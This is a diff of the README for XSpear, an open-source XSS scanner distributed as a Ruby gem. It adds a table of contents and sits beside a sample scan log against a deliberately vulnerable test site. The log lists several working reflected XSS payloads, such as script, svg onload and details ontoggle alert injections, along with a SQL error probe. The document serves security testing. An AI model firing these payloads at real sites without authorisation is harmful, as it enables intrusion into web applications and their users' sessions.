@@ -5,6 +5,27 @@ XSpear is XSS Scanner on ruby gems
 
 <img src="https://img.shields.io/static/v1.svg?label=lang&message=ruby&color=RED"> <img src="https://img.shields.io/gem/v/XSpear.svg"> <img src="https://img.shields.io/gem/dt/XSpear.svg"> <img src="https://img.shields.io/github/license/hahwul/XSpear.svg"> <a href="https://twitter.com/intent/follow?screen_name=hahwul"><img src="https://img.shields.io/static/v1.svg?label=follow&message=hahwul&color=black"></a>
 
+## TOC
+- [XSpear](#xspear)
+  * [Key features](#key-features)
+  * [Installation](#installation)
+    + [Dependency gems](#dependency-gems)
+  * [Usage on cli](#usage-on-cli)
+    + [Result types](#result-types)
+    + [Verbose Mode](#verbose-mode)
+    + [Case by Case](#case-by-case)
+    + [Sample log](#sample-log)
+  * [Usage on ruby code](#usage-on-ruby-code)
+  * [Add Scanning Module](#add-scanning-module)
+  * [Update](#update)
+  * [Development](#development)
+  * [Contributing](#contributing)
+  * [Donate](#donate)
+  * [License](#license)
+  * [Code of Conduct](#code-of-conduct)
+  * [ScreenShot](#screenshot)
+  * [Video](#video)
+
 ## Key features
 - Pattern matching based XSS scanning
 - Detect `alert` `confirm` `prompt` event on headless browser (with Selenium)
@@ -394,7 +415,7 @@ $ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123&zfdfasdf=124fff
 {"starttime":"2019-08-14 23:58:12 +0900","endtime":"2019-08-14 23:58:44 +0900","issue_count":24,"issue_list":[{"id":0,"type":"INFO","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Found Server: nginx/1.4.1"},{"id":1,"type":"INFO","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Not set HSTS"},{"id":2,"type":"INFO","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Content-Type: text/html"},{"id":3,"type":"LOW","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Not Set X-Frame-Options"},{"id":4,"type":"MIDUM","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Not Set CSP"},{"id":5,"type":"INFO","issue":"DYNAMIC ANALYSIS","method":"GET","param":"cat","payload":"XsPeaR\"","description":"Found SQL Error Pattern"},{"id":6,"type":"INFO","issue":"REFLECTED","method":"GET","param":"cat","payload":"rEfe6","description":"reflected parameter"},{"id":7,"type":"INFO","issue":"FILERD RULE","method":"GET","param":"cat","payload":"onhwul=64","description":"not filtered event handler on{any} pattern"},{"id":8,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<script>alert(45)</script>","description":"reflected XSS Code"},{"id":9,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<textarea autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":10,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<video/poster/onerror=alert(45)>","description":"reflected HTML5 XSS Code"},{"id":11,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<audio src onloadstart=alert(45)>","description":"reflected HTML5 XSS Code"},{"id":12,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<details/open/ontoggle=\"alert`45`\">","description":"reflected HTML5 XSS Code"},{"id":13,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<select autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":14,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<marquee onstart=alert(45)>","description":"reflected HTML5 XSS Code"},{"id":15,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<input autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":16,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"\"><iframe/src=JavaScriPt:alert(45)>","description":"reflected XSS Code"},{"id":17,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<meter onmouseover=alert(45)>0</meter>","description":"reflected HTML5 XSS Code"},{"id":18,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<keygen autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":19,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<audio src onloadstart=alert(45)>","description":"triggered <audio src onloadstart=alert(45)>"},{"id":20,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<marquee onstart=alert(45)>","description":"triggered <marquee onstart=alert(45)>"},{"id":21,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<details/open/ontoggle=\"alert(45)\">","description":"triggered <details/open/ontoggle=\"alert(45)\">"},{"id":22,"type":"VULN","issue":"XSS","method":"GET","param":"cat","payload":"<script>alert(45)</script>","description":"triggered <script>alert(45)</script>"},{"id":23,"type":"VULN","issue":"XSS","method":"GET","param":"cat","payload":"'\"><svg/onload=alert(45)>","description":"triggered <svg/onload=alert(45)>"}]}
 ```
 
-## Usage on ruby code (gem library)
+## Usage on ruby code
 ```ruby
 require 'XSPear'
 
